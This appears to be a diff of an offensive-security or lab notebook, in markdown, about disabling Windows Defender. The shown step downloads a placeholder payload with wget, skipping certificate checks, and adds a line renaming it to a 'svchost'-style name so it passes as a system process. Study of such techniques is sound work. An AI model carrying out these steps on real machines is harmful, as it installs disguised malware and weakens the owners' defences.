@@ -139,6 +139,7 @@ Disable Windows Defender:
 1. **Download Payload, Rename file to "svchost-emaan.exe", move the file to a new directory**
     
     `wget <payload_download_link> --no-check-certificate
+    `mv lcd5d49e-680e-4478-8526-708858e25b14 svch`
     
     ![[Pasted image 20251018170657.png]]
     
